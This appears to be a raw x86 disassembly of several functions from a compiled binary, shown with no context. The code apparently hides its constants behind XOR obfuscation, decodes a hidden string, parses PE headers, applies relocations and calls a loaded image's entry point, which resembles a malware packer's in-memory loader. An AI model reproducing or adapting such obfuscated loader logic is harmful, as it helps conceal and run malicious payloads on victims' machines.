  41ee8b:	shr    ecx,0x1f
  41ee8e:	cmp    eax,ecx
  41ee90:	je     0x41eeaa
  41ee92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ee95:	mov    eax,DWORD PTR [ebp+0x10]
  41ee98:	mov    eax,DWORD PTR [eax+0x1d8]
  41ee9e:	movzx  ecx,cx
  41eea1:	push   ecx
  41eea2:	push   DWORD PTR [ebp-0xc]
  41eea5:	call   DWORD PTR [eax+0x8]
  41eea8:	jmp    0x41eec3
  41eeaa:	mov    eax,DWORD PTR [ebp+0xc]
  41eead:	add    eax,DWORD PTR [ebp+0x8]
  41eeb0:	mov    ecx,DWORD PTR [ebp+0x10]
  41eeb3:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41eeb9:	add    eax,0x2
  41eebc:	push   eax
  41eebd:	push   DWORD PTR [ebp-0xc]
  41eec0:	call   DWORD PTR [ecx+0x8]
  41eec3:	mov    DWORD PTR [ebp+0xc],eax
  41eec6:	mov    eax,DWORD PTR [ebp-0x4]
  41eec9:	mov    ecx,DWORD PTR [ebp+0xc]
  41eecc:	xor    eax,esi
  41eece:	add    eax,edi
  41eed0:	cmp    eax,ecx
  41eed2:	mov    eax,DWORD PTR [ebp-0x8]
  41eed5:	jne    0x41eee8
  41eed7:	mov    ecx,DWORD PTR [ebp-0x18]
  41eeda:	xor    eax,esi
  41eedc:	lea    eax,[ecx+eax*1+0x3272e4]
  41eee3:	mov    DWORD PTR [ebp-0x18],eax
  41eee6:	jmp    0x41eef8
  41eee8:	mov    ecx,DWORD PTR [ebp+0xc]
  41eeeb:	xor    eax,esi
  41eeed:	add    eax,edi
  41eeef:	imul   eax,ecx
  41eef2:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eef5:	mov    DWORD PTR [ecx+ebx*4],eax
  41eef8:	mov    eax,DWORD PTR [ebp-0x8]
  41eefb:	xor    eax,esi
  41eefd:	lea    ebx,[ebx+eax*1+0x3272e4]
  41ef04:	mov    eax,DWORD PTR [ebp-0x4]
  41ef07:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ef0a:	xor    eax,esi
  41ef0c:	add    eax,edi
  41ef0e:	cmp    DWORD PTR [ecx+ebx*4],eax
  41ef11:	jne    0x41ee42
  41ef17:	mov    edx,DWORD PTR [ebp-0x10]
  41ef1a:	mov    eax,DWORD PTR [ebp-0x18]
  41ef1d:	mov    ecx,DWORD PTR [ebp-0x2c]
  41ef20:	sub    edx,0x3272e3
  41ef26:	xor    edx,esi
  41ef28:	jmp    0x41ecf2
  41ef2d:	mov    ecx,DWORD PTR [ebp-0x4]
  41ef30:	xor    ecx,esi
  41ef32:	add    ecx,edi
  41ef34:	cmp    eax,ecx
  41ef36:	mov    eax,DWORD PTR [ebp-0x4]
  41ef39:	jne    0x41ef43
  41ef3b:	mov    eax,DWORD PTR [ebp-0x8]
  41ef3e:	jmp    0x41ef43
  41ef40:	mov    eax,DWORD PTR [ebp-0x4]
  41ef43:	xor    eax,esi
  41ef45:	add    eax,edi
  41ef47:	pop    edi
  41ef48:	pop    esi
  41ef49:	pop    ebx
  41ef4a:	leave  
  41ef4b:	ret    0xc
  41ef4e:	push   ebp
  41ef4f:	mov    ebp,esp
  41ef51:	sub    esp,0x28
  41ef54:	mov    DWORD PTR [ebp-0x4],0xf89c8581
  41ef5b:	mov    DWORD PTR [ebp-0x28],0xf89c8580
  41ef62:	mov    eax,DWORD PTR [ebp+0xc]
  41ef65:	mov    DWORD PTR [ebp+0xc],eax
  41ef68:	push   esi
  41ef69:	mov    eax,eax
  41ef6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ef6e:	mov    esi,DWORD PTR [ebp+0x8]
  41ef71:	mov    ecx,0x751089d
  41ef76:	xor    eax,ecx
  41ef78:	mov    edx,0x3272e4
  41ef7d:	add    eax,edx
  41ef7f:	cmp    esi,eax
  41ef81:	je     0x41f0a8
  41ef87:	mov    eax,DWORD PTR [ebp+0x8]
  41ef8a:	mov    esi,DWORD PTR [ebp+0x8]
  41ef8d:	add    esi,DWORD PTR [eax+0x3c]
  41ef90:	push   edi
  41ef91:	mov    DWORD PTR [ebp+0xc],esi
  41ef94:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  41ef9b:	mov    eax,DWORD PTR [ebp-0x1c]
  41ef9e:	mov    esi,DWORD PTR [ebp-0x4]
  41efa1:	mov    edi,DWORD PTR [ebp+0xc]
  41efa4:	xor    esi,ecx
  41efa6:	xor    eax,ecx
  41efa8:	add    esi,edx
  41efaa:	cmp    DWORD PTR [edi+eax*8+0x1939798],esi
  41efb1:	je     0x41f0a2
  41efb7:	mov    esi,DWORD PTR [ebp+0xc]
  41efba:	mov    eax,DWORD PTR [ebp+0x8]
  41efbd:	add    eax,DWORD PTR [esi+0xa0]
  41efc3:	mov    esi,DWORD PTR [ebp+0x8]
  41efc6:	mov    edi,DWORD PTR [ebp+0xc]
  41efc9:	sub    esi,DWORD PTR [edi+0x34]
  41efcc:	mov    edi,DWORD PTR [ebp-0x4]
  41efcf:	xor    edi,ecx
  41efd1:	add    edi,edx
  41efd3:	mov    DWORD PTR [ebp-0x24],esi
  41efd6:	cmp    esi,edi
  41efd8:	je     0x41f0a2
  41efde:	mov    esi,DWORD PTR [ebp-0x4]
  41efe1:	xor    esi,ecx
  41efe3:	add    esi,edx
  41efe5:	mov    DWORD PTR [ebp-0x8],esi
  41efe8:	push   ebx
  41efe9:	mov    DWORD PTR [ebp-0x10],0xf89c8582
  41eff0:	jmp    0x41f08c
  41eff5:	mov    esi,DWORD PTR [ebp-0x4]
  41eff8:	xor    esi,ecx
  41effa:	lea    edi,[ebx-0x8]
  41effd:	add    esi,edx
  41efff:	shr    edi,1
  41f001:	cmp    esi,edi
  41f003:	jae    0x41f072
  41f005:	sub    edi,esi
  41f007:	lea    ebx,[eax+esi*2+0x8]
  41f00b:	mov    DWORD PTR [ebp-0x18],edi
  41f00e:	movzx  esi,WORD PTR [ebx]
  41f011:	and    esi,0xfff
  41f017:	mov    DWORD PTR [ebp-0x14],esi
  41f01a:	mov    edi,DWORD PTR [ebp-0x14]
  41f01d:	mov    esi,DWORD PTR [eax]
  41f01f:	sub    esi,edx
  41f021:	add    edi,esi
  41f023:	movzx  esi,WORD PTR [ebx]
  41f026:	shr    esi,0xc
  41f029:	xor    edi,ecx
  41f02b:	mov    DWORD PTR [ebp-0x20],edi
  41f02e:	mov    DWORD PTR [ebp-0x14],esi
  41f031:	mov    esi,DWORD PTR [ebp-0x20]
  41f034:	mov    edi,DWORD PTR [ebp+0x8]
  41f037:	xor    esi,ecx
  41f039:	lea    esi,[esi+edi*1+0x3272e4]
  41f040:	mov    DWORD PTR [ebp-0x20],esi
  41f043:	mov    esi,DWORD PTR [ebp-0x10]
  41f046:	mov    edi,DWORD PTR [ebp-0x14]
  41f049:	xor    esi,ecx
  41f04b:	add    esi,edx
  41f04d:	cmp    edi,esi
  41f04f:	jne    0x41f067
  41f051:	mov    esi,DWORD PTR [ebp-0x10]
  41f054:	mov    edi,DWORD PTR [ebp-0x14]
  41f057:	xor    esi,ecx
  41f059:	add    esi,edx
  41f05b:	cmp    edi,esi
  41f05d:	jne    0x41f067
  41f05f:	mov    esi,DWORD PTR [ebp-0x20]
  41f062:	mov    edi,DWORD PTR [ebp-0x24]
  41f065:	add    DWORD PTR [esi],edi
  41f067:	add    ebx,0x2
  41f06a:	dec    DWORD PTR [ebp-0x18]
  41f06d:	jne    0x41f00e
  41f06f:	mov    ebx,DWORD PTR [ebp-0xc]
  41f072:	add    DWORD PTR [ebp-0x8],ebx
  41f075:	mov    esi,DWORD PTR [ebp-0x1c]
  41f078:	mov    edi,DWORD PTR [ebp-0x8]
  41f07b:	mov    ebx,DWORD PTR [ebp+0xc]
  41f07e:	xor    esi,ecx
  41f080:	cmp    edi,DWORD PTR [ebx+esi*8+0x193979c]
  41f087:	jae    0x41f0a1
  41f089:	add    eax,DWORD PTR [ebp-0xc]
  41f08c:	mov    esi,DWORD PTR [ebp-0x4]
  41f08f:	mov    ebx,DWORD PTR [eax+0x4]
  41f092:	xor    esi,ecx
  41f094:	add    esi,edx
  41f096:	mov    DWORD PTR [ebp-0xc],ebx
  41f099:	cmp    ebx,esi
  41f09b:	jne    0x41eff5
  41f0a1:	pop    ebx
  41f0a2:	mov    eax,DWORD PTR [ebp-0x28]
  41f0a5:	pop    edi
  41f0a6:	jmp    0x41f0ab
  41f0a8:	mov    eax,DWORD PTR [ebp-0x4]
  41f0ab:	xor    eax,ecx
  41f0ad:	add    eax,edx
  41f0af:	pop    esi
  41f0b0:	leave  
  41f0b1:	ret    0x8
  41f0b4:	push   ebp
  41f0b5:	mov    ebp,esp
  41f0b7:	sub    esp,0xd8
  41f0bd:	mov    DWORD PTR [ebp-0x4],0xf89c8581
  41f0c4:	mov    DWORD PTR [ebp-0x24],0xf89c8580
  41f0cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f0ce:	push   ebx
  41f0cf:	push   esi
  41f0d0:	mov    esi,0x751089d
  41f0d5:	xor    eax,esi
  41f0d7:	push   edi
  41f0d8:	mov    edi,0x3272e4
  41f0dd:	add    eax,edi
  41f0df:	mov    DWORD PTR [ebp-0x18],eax
  41f0e2:	mov    eax,DWORD PTR [ebp-0x4]
  41f0e5:	xor    eax,esi
  41f0e7:	add    eax,edi
  41f0e9:	mov    DWORD PTR [ebp-0x8],eax
  41f0ec:	mov    ebx,DWORD PTR [ebp+0x20]
  41f0ef:	mov    eax,DWORD PTR [ebp-0x1c]
  41f0f2:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f0f5:	xor    eax,ecx
  41f0f7:	mov    DWORD PTR [ebp-0x1c],eax
  41f0fa:	add    DWORD PTR [ebp-0x1c],0xf89cb581
  41f101:	mov    eax,DWORD PTR [ebp-0xc]
  41f104:	mov    ecx,DWORD PTR [ebp-0xc]
  41f107:	xor    eax,ecx
  41f109:	mov    DWORD PTR [ebp-0xc],eax
  41f10c:	add    DWORD PTR [ebp-0xc],0xf89c85c1
  41f113:	mov    eax,DWORD PTR [ebp-0x10]
  41f116:	mov    ecx,DWORD PTR [ebp-0x10]
  41f119:	xor    eax,ecx
  41f11b:	mov    DWORD PTR [ebp-0x10],eax
  41f11e:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  41f125:	mov    eax,DWORD PTR [ebp-0x28]
  41f128:	mov    ecx,DWORD PTR [ebp-0x28]
  41f12b:	xor    eax,ecx
  41f12d:	mov    DWORD PTR [ebp-0x28],eax
  41f130:	add    DWORD PTR [ebp-0x28],0xf89f0581
  41f137:	mov    DWORD PTR [ebp+0x20],0xf89ceff4
  41f13e:	mov    eax,DWORD PTR [ebp+0x8]
  41f141:	test   eax,eax
  41f143:	je     0x41f5cc
  41f149:	mov    eax,DWORD PTR [ebp+0xc]
  41f14c:	test   eax,eax
  41f14e:	je     0x41f5cc
  41f154:	mov    eax,DWORD PTR [ebp+0x18]
  41f157:	test   eax,eax
  41f159:	je     0x41f5cc
  41f15f:	mov    eax,DWORD PTR [ebp+0x20]
  41f162:	mov    ecx,DWORD PTR [ebp+0x8]
  41f165:	xor    eax,0x89d
  41f16a:	add    eax,0x72e4
  41f16f:	cmp    WORD PTR [ecx],ax
  41f172:	jne    0x41f5cc
  41f178:	mov    eax,DWORD PTR [ebp-0x4]
  41f17b:	xor    eax,esi
  41f17d:	add    eax,edi
  41f17f:	mov    DWORD PTR [ebp-0x30],eax
  41f182:	mov    eax,DWORD PTR [ebp-0x4]
  41f185:	mov    ecx,DWORD PTR [ebp+0x8]
  41f188:	mov    eax,DWORD PTR [ebp+0x8]
  41f18b:	add    eax,DWORD PTR [ecx+0x3c]
  41f18e:	mov    DWORD PTR [ebp+0xc],eax
  41f191:	mov    eax,DWORD PTR [eax+0x50]
  41f194:	test   eax,eax
  41f196:	je     0x41f5cc
  41f19c:	mov    DWORD PTR [ebp-0x2c],0xf88c8581
  41f1a3:	mov    eax,DWORD PTR [ebp-0x2c]
  41f1a6:	xor    eax,esi
  41f1a8:	add    eax,edi
  41f1aa:	mov    DWORD PTR [ebp-0x2c],eax
  41f1ad:	mov    eax,DWORD PTR [ebp-0x4]
  41f1b0:	mov    eax,DWORD PTR [ebx+0x190]
  41f1b6:	mov    ecx,DWORD PTR [eax]
  41f1b8:	mov    ecx,DWORD PTR [ecx+0x3c]
  41f1bb:	add    ecx,DWORD PTR [eax]
  41f1bd:	mov    eax,DWORD PTR [ebp-0x4]
  41f1c0:	mov    eax,DWORD PTR [ebx+0x18c]
  41f1c6:	mov    edx,DWORD PTR [eax]
  41f1c8:	mov    DWORD PTR [ebp-0x20],ecx
  41f1cb:	mov    DWORD PTR [ebp+0x20],edx
  41f1ce:	cmp    edx,edx
  41f1d0:	jne    0x41f204
  41f1d2:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f1d8:	lea    edx,[ebp-0x18]
  41f1db:	push   edx
  41f1dc:	mov    edx,DWORD PTR [ebp-0xc]
  41f1df:	xor    edx,esi
  41f1e1:	add    edx,edi
  41f1e3:	push   edx
  41f1e4:	push   DWORD PTR [ecx+0x50]
  41f1e7:	push   DWORD PTR [ebp+0x20]
  41f1ea:	call   DWORD PTR [eax+0x1c]
  41f1ed:	mov    eax,DWORD PTR [ebp-0x20]
  41f1f0:	mov    ecx,DWORD PTR [eax+0x54]
  41f1f3:	mov    eax,DWORD PTR [eax+0x50]
  41f1f6:	sub    eax,ecx
  41f1f8:	add    ecx,DWORD PTR [ebp+0x20]
  41f1fb:	push   ecx
  41f1fc:	call   0x41fb69
  41f201:	mov    edx,DWORD PTR [ebp+0x20]
  41f204:	mov    eax,DWORD PTR [ebx+0x194]
  41f20a:	mov    DWORD PTR [eax],edx
  41f20c:	mov    eax,DWORD PTR [ebp+0xc]
  41f20f:	push   DWORD PTR [eax+0x54]
  41f212:	push   DWORD PTR [ebp+0x8]
  41f215:	push   edx
  41f216:	call   0x41fa5f
  41f21b:	mov    ecx,DWORD PTR [ebp+0x20]
  41f21e:	mov    eax,DWORD PTR [ecx+0x3c]
  41f221:	add    eax,ecx
  41f223:	movzx  ecx,WORD PTR [eax+0x14]
  41f227:	lea    ecx,[ecx+eax*1+0x18]
  41f22b:	mov    DWORD PTR [ebp+0x18],ecx
  41f22e:	mov    ecx,DWORD PTR [ebp-0x4]
  41f231:	movzx  edx,WORD PTR [eax+0x6]
  41f235:	xor    ecx,esi
  41f237:	add    ecx,edi
  41f239:	mov    DWORD PTR [ebp+0xc],eax
  41f23c:	cmp    edx,ecx
  41f23e:	je     0x41f2eb
  41f244:	mov    ecx,DWORD PTR [ebp-0x4]
  41f247:	xor    ecx,esi
  41f249:	add    ecx,edi
  41f24b:	mov    DWORD PTR [ebp-0x8],ecx
  41f24e:	mov    ecx,DWORD PTR [ebp-0x24]
  41f251:	movzx  edx,WORD PTR [eax+0x6]
  41f255:	xor    ecx,esi
  41f257:	sub    edx,ecx
  41f259:	sub    edx,edi
  41f25b:	cmp    DWORD PTR [ebp-0x8],edx
  41f25e:	ja     0x41f2eb
  41f264:	mov    edx,DWORD PTR [ebp+0x18]
  41f267:	add    edx,0x8
  41f26a:	mov    DWORD PTR [ebp+0x18],edx
  41f26d:	jmp    0x41f272
  41f26f:	mov    edx,DWORD PTR [ebp+0x18]
  41f272:	mov    eax,DWORD PTR [eax+0x38]
  41f275:	lea    ecx,[eax-0x1]
  41f278:	mov    DWORD PTR [ebp-0x38],eax
  41f27b:	mov    eax,DWORD PTR [edx]
  41f27d:	test   eax,ecx
  41f27f:	je     0x41f288
  41f281:	not    ecx
  41f283:	and    eax,ecx
  41f285:	add    eax,DWORD PTR [ebp-0x38]
  41f288:	mov    ecx,DWORD PTR [edx+0x4]
  41f28b:	add    ecx,DWORD PTR [ebp+0x20]
  41f28e:	push   ecx
  41f28f:	call   0x41fb69
  41f294:	mov    edx,DWORD PTR [ebp-0x4]
  41f297:	mov    eax,DWORD PTR [ebp+0x18]
  41f29a:	mov    ecx,DWORD PTR [eax+0x8]
  41f29d:	xor    edx,esi
  41f29f:	add    edx,edi
  41f2a1:	cmp    ecx,edx
  41f2a3:	je     0x41f2bc
  41f2a5:	push   ecx
  41f2a6:	mov    ecx,DWORD PTR [ebp+0x8]
  41f2a9:	add    ecx,DWORD PTR [eax+0xc]
  41f2ac:	mov    eax,DWORD PTR [eax+0x4]
  41f2af:	add    eax,DWORD PTR [ebp+0x20]
  41f2b2:	push   ecx
  41f2b3:	push   eax
  41f2b4:	call   0x41fa5f
  41f2b9:	mov    eax,DWORD PTR [ebp+0x18]
  41f2bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41f2bf:	mov    edx,DWORD PTR [ebp-0x8]
  41f2c2:	add    eax,0x28
  41f2c5:	xor    ecx,esi
  41f2c7:	lea    ecx,[edx+ecx*1+0x3272e4]
  41f2ce:	mov    edx,DWORD PTR [ebp+0xc]
  41f2d1:	mov    DWORD PTR [ebp+0x18],eax
  41f2d4:	mov    eax,DWORD PTR [ebp-0x24]
  41f2d7:	movzx  edx,WORD PTR [edx+0x6]
  41f2db:	xor    eax,esi
  41f2dd:	sub    edx,eax
  41f2df:	mov    eax,DWORD PTR [ebp+0xc]
  41f2e2:	sub    edx,edi
  41f2e4:	mov    DWORD PTR [ebp-0x8],ecx
  41f2e7:	cmp    ecx,edx
  41f2e9:	jbe    0x41f26f
  41f2eb:	mov    edx,DWORD PTR [ebx+0x18c]
  41f2f1:	mov    ecx,DWORD PTR [ebp+0x20]
  41f2f4:	cmp    ecx,DWORD PTR [edx]
  41f2f6:	jne    0x41f31f
  41f2f8:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f2fe:	lea    edx,[ebp-0x18]
  41f301:	push   edx
  41f302:	mov    edx,DWORD PTR [ebp-0x10]
  41f305:	xor    edx,esi
  41f307:	add    edx,edi
  41f309:	push   edx
  41f30a:	mov    edx,DWORD PTR [ebp-0x20]
  41f30d:	push   DWORD PTR [edx+0x54]
  41f310:	push   ecx
  41f311:	call   DWORD PTR [eax+0x1c]
  41f314:	test   eax,eax
  41f316:	je     0x41f5bd
  41f31c:	mov    eax,DWORD PTR [ebp+0xc]
  41f31f:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41f325:	mov    ecx,DWORD PTR [ecx]
  41f327:	xor    ecx,esi
  41f329:	add    ecx,edi
  41f32b:	je     0x41f4e8
  41f331:	mov    eax,DWORD PTR [ebp-0x4]
  41f334:	xor    eax,esi
  41f336:	add    eax,edi
  41f338:	and    DWORD PTR [ebp+0x8],0x0
  41f33c:	mov    DWORD PTR [ebp-0x14],eax
  41f33f:	mov    eax,0xf89c851d
  41f344:	lea    ecx,[eax-0x8]
  41f347:	mov    DWORD PTR [ebp-0x58],0xf89c8517
  41f34e:	mov    DWORD PTR [ebp-0x54],0xf89c850d
  41f355:	mov    DWORD PTR [ebp-0x50],eax
  41f358:	mov    DWORD PTR [ebp-0x4c],ecx
  41f35b:	mov    DWORD PTR [ebp-0x48],ecx
  41f35e:	mov    DWORD PTR [ebp-0x44],0xf89c8581
  41f365:	mov    edx,DWORD PTR [ebp+0x8]
  41f368:	mov    ecx,0x89d
  41f36d:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  41f372:	mov    edx,0x72e4
  41f377:	add    cx,dx
  41f37a:	mov    edx,DWORD PTR [ebp+0x8]
  41f37d:	inc    DWORD PTR [ebp+0x8]
  41f380:	cmp    DWORD PTR [ebp+0x8],0x6
  41f384:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  41f38c:	jb     0x41f365
  41f38e:	mov    ecx,0xf89c8513
  41f393:	mov    DWORD PTR [ebp-0xb0],eax
  41f399:	mov    DWORD PTR [ebp-0x9c],eax
  41f39f:	mov    DWORD PTR [ebp-0x74],eax
  41f3a2:	mov    DWORD PTR [ebp-0x70],eax
  41f3a5:	lea    eax,[ecx-0x1]
  41f3a8:	mov    edx,0xf89c85ff
  41f3ad:	mov    DWORD PTR [ebp-0x64],eax
  41f3b0:	mov    DWORD PTR [ebp-0x60],eax
  41f3b3:	mov    DWORD PTR [ebp-0xb4],0xf89c85f5
  41f3bd:	mov    DWORD PTR [ebp-0xac],ecx
  41f3c3:	mov    DWORD PTR [ebp-0xa8],edx
  41f3c9:	mov    DWORD PTR [ebp-0xa4],0xf89c8518
  41f3d3:	mov    DWORD PTR [ebp-0xa0],0xf89c8517
  41f3dd:	mov    DWORD PTR [ebp-0x98],0xf89c85fc
  41f3e7:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41f3f1:	mov    DWORD PTR [ebp-0x90],0xf89c850d
  41f3fb:	mov    DWORD PTR [ebp-0x8c],ecx
  41f401:	mov    DWORD PTR [ebp-0x88],0xf89c8508
  41f40b:	mov    DWORD PTR [ebp-0x84],edx
  41f411:	mov    DWORD PTR [ebp-0x80],0xf89c8516
  41f418:	mov    DWORD PTR [ebp-0x7c],ecx
  41f41b:	mov    DWORD PTR [ebp-0x78],0xf89c85c0
  41f422:	mov    DWORD PTR [ebp-0x6c],ecx
  41f425:	mov    DWORD PTR [ebp-0x68],0xf89c851c
  41f42c:	mov    DWORD PTR [ebp-0x5c],0xf89c8581
  41f433:	xor    eax,eax
  41f435:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  41f43c:	xor    cl,0x9d
  41f43f:	sub    cl,0x1c
  41f442:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  41f449:	inc    eax
  41f44a:	cmp    eax,0x17
  41f44d:	jb     0x41f435
  41f44f:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f455:	lea    ecx,[ebp-0xc0]
  41f45b:	push   ecx
  41f45c:	call   DWORD PTR [eax+0x4]
  41f45f:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41f465:	lea    edx,[ebp-0xd8]
  41f46b:	push   edx
  41f46c:	push   eax
  41f46d:	call   DWORD PTR [ecx+0x8]
  41f470:	mov    DWORD PTR [ebp-0x40],eax
  41f473:	lea    eax,[ebp-0x14]
  41f476:	push   eax
  41f477:	mov    eax,DWORD PTR [ebx+0x18c]
  41f47d:	push   DWORD PTR [eax]
  41f47f:	mov    eax,DWORD PTR [ebp-0x40]
  41f482:	call   eax
  41f484:	mov    eax,DWORD PTR [ebp-0x4]
  41f487:	xor    eax,esi
  41f489:	add    eax,edi
  41f48b:	mov    DWORD PTR [ebp-0x34],eax
  41f48e:	mov    ecx,DWORD PTR [ebp-0x4]
  41f491:	mov    eax,DWORD PTR [ebp-0x14]
  41f494:	xor    ecx,esi
  41f496:	add    ecx,edi
  41f498:	cmp    eax,ecx
  41f49a:	je     0x41f4e5
  41f49c:	mov    DWORD PTR [ebp-0x3c],eax
  41f49f:	jmp    0x41f4b0
  41f4a1:	mov    eax,DWORD PTR [eax]
  41f4a3:	mov    ecx,DWORD PTR [ebp-0x3c]
  41f4a6:	mov    DWORD PTR [ebp-0x14],eax
  41f4a9:	mov    eax,DWORD PTR [ebp-0x14]
  41f4ac:	cmp    eax,ecx
  41f4ae:	je     0x41f4bd
  41f4b0:	mov    edx,DWORD PTR [eax+0x18]
  41f4b3:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f4b9:	cmp    edx,DWORD PTR [ecx]
  41f4bb:	jne    0x41f4a1
  41f4bd:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f4c3:	mov    edx,DWORD PTR [eax+0x18]
  41f4c6:	cmp    edx,DWORD PTR [ecx]
  41f4c8:	jne    0x41f4e5
  41f4ca:	mov    ecx,DWORD PTR [ebx+0x190]
  41f4d0:	mov    edx,DWORD PTR [ebp-0x20]
  41f4d3:	mov    edx,DWORD PTR [edx+0x28]
  41f4d6:	add    edx,DWORD PTR [ecx]
  41f4d8:	mov    DWORD PTR [eax+0x1c],edx
  41f4db:	mov    eax,DWORD PTR [ebp-0x24]
  41f4de:	xor    eax,esi
  41f4e0:	add    eax,edi
  41f4e2:	mov    DWORD PTR [ebp-0x34],eax
  41f4e5:	mov    eax,DWORD PTR [ebp+0xc]
  41f4e8:	push   ebx
  41f4e9:	push   eax
  41f4ea:	push   DWORD PTR [ebp+0x20]
  41f4ed:	call   0x41ec6b
  41f4f2:	test   eax,eax
  41f4f4:	je     0x41f5bd
  41f4fa:	push   DWORD PTR [ebp+0xc]
  41f4fd:	mov    ecx,ebx
  41f4ff:	push   DWORD PTR [ebp+0x20]
  41f502:	call   0x41ebc4
  41f507:	test   eax,eax
  41f509:	je     0x41f5bd
  41f50f:	mov    eax,DWORD PTR [ebp+0xc]
  41f512:	mov    edx,DWORD PTR [ebp+0x20]
  41f515:	mov    ecx,ebx
  41f517:	call   0x41ea9d
  41f51c:	test   eax,eax
  41f51e:	je     0x41f5bd
  41f524:	push   ebx
  41f525:	push   DWORD PTR [ebp+0x20]
  41f528:	call   0x41ef4e
  41f52d:	test   eax,eax
  41f52f:	je     0x41f5bd
  41f535:	mov    eax,DWORD PTR [ebx+0x18c]
  41f53b:	mov    edx,DWORD PTR [ebp+0x20]
  41f53e:	cmp    edx,DWORD PTR [eax]
  41f540:	jne    0x41f55c
  41f542:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f548:	lea    ecx,[ebp-0x18]
  41f54b:	push   ecx
  41f54c:	push   DWORD PTR [ebp-0x18]
  41f54f:	mov    ecx,DWORD PTR [ebp-0x20]
  41f552:	push   DWORD PTR [ecx+0x54]
  41f555:	push   edx
  41f556:	call   DWORD PTR [eax+0x1c]
  41f559:	mov    edx,DWORD PTR [ebp+0x20]
  41f55c:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f562:	mov    eax,DWORD PTR [eax]
  41f564:	xor    eax,esi
  41f566:	add    eax,edi
  41f568:	je     0x41f5a1
  41f56a:	mov    ecx,DWORD PTR [ebp+0xc]
  41f56d:	mov    eax,DWORD PTR [ecx+0x28]
  41f570:	mov    DWORD PTR [ebp+0x8],0xf89ca581
  41f577:	mov    esi,DWORD PTR [ebp+0x8]
  41f57a:	push   DWORD PTR [ebp+0x14]
  41f57d:	xor    esi,0x89d
  41f583:	push   DWORD PTR [ebp+0x10]
  41f586:	add    esi,0x72e4
  41f58c:	or     WORD PTR [ecx+0x16],si
  41f590:	add    eax,edx
  41f592:	push   edx
  41f593:	call   eax
  41f595:	mov    DWORD PTR [ebx+0x1d0],0xf89c8580
  41f59f:	jmp    0x41f5ab
  41f5a1:	mov    eax,DWORD PTR [ebp+0xc]
  41f5a4:	mov    eax,DWORD PTR [eax+0x28]
  41f5a7:	add    eax,edx
  41f5a9:	call   eax
  41f5ab:	mov    DWORD PTR [ebp-0x8],eax
  41f5ae:	mov    eax,DWORD PTR [ebp-0x8]
  41f5b1:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f5b4:	mov    DWORD PTR [ecx],eax
  41f5b6:	mov    DWORD PTR [ebp-0x30],0x1
  41f5bd:	cmp    DWORD PTR [ebp-0x30],0x0
  41f5c1:	jne    0x41f5c7
  41f5c3:	and    DWORD PTR [ebp+0x20],0x0
  41f5c7:	mov    eax,DWORD PTR [ebp+0x20]
  41f5ca:	jmp    0x41f5ce
  41f5cc:	xor    eax,eax
  41f5ce:	pop    edi
  41f5cf:	pop    esi
  41f5d0:	pop    ebx
  41f5d1:	leave  
  41f5d2:	ret    0x1c
  41f5d5:	push   ebp
  41f5d6:	mov    ebp,esp
  41f5d8:	movzx  edx,WORD PTR [ecx+0x6]
  41f5dc:	movzx  eax,WORD PTR [ecx+0x14]
  41f5e0:	push   ebx
  41f5e1:	push   edi
  41f5e2:	xor    edi,edi
  41f5e4:	lea    eax,[eax+ecx*1+0x18]
  41f5e8:	test   edx,edx
  41f5ea:	je     0x41f60b
  41f5ec:	mov    ecx,DWORD PTR [eax+0xc]
  41f5ef:	lea    ebx,[ecx+esi*1]
  41f5f2:	cmp    DWORD PTR [ebp+0x8],ebx
  41f5f5:	jb     0x41f603
  41f5f7:	mov    ebx,DWORD PTR [eax+0x8]
  41f5fa:	add    ebx,ecx
  41f5fc:	add    ebx,esi
  41f5fe:	cmp    DWORD PTR [ebp+0x8],ebx
  41f601:	jb     0x41f60d
  41f603:	add    eax,0x28
  41f606:	inc    edi
  41f607:	cmp    edi,edx
  41f609:	jb     0x41f5ec
  41f60b:	xor    eax,eax
  41f60d:	pop    edi
  41f60e:	pop    ebx
  41f60f:	pop    ebp
  41f610:	ret    0x4
  41f613:	push   ebp
  41f614:	mov    ebp,esp
  41f616:	sub    esp,0x34
  41f619:	mov    DWORD PTR [ebp-0xc],0xf89c8581
  41f620:	mov    DWORD PTR [ebp-0x18],0xf89c8580
  41f627:	mov    DWORD PTR [ebp-0x1c],0xf89c8583
  41f62e:	mov    DWORD PTR [ebp-0x8],0xf89c85e0
  41f635:	mov    DWORD PTR [ebp-0x20],0xf89c85c0
  41f63c:	mov    DWORD PTR [ebp-0x2c],0xf89c850b
  41f643:	mov    DWORD PTR [ebp-0x2c],0xf89c85eb
  41f64a:	mov    DWORD PTR [ebp-0x10],eax
  41f64d:	mov    eax,DWORD PTR [ebp+0x8]
  41f650:	mov    DWORD PTR [ebp-0x14],eax
  41f653:	mov    eax,DWORD PTR [ebp-0xc]
  41f656:	push   ebx
  41f657:	mov    ecx,0x751089d
  41f65c:	xor    eax,ecx
  41f65e:	push   esi
  41f65f:	mov    esi,DWORD PTR [ebp-0x10]
  41f662:	mov    edx,0x3272e4
  41f667:	add    eax,edx
  41f669:	push   edi
  41f66a:	cmp    esi,eax
  41f66c:	je     0x41f84b
  41f672:	mov    eax,DWORD PTR [ebp-0xc]
  41f675:	mov    esi,DWORD PTR [ebp-0x14]
  41f678:	xor    eax,ecx
  41f67a:	add    eax,edx
  41f67c:	cmp    esi,eax
  41f67e:	je     0x41f84b
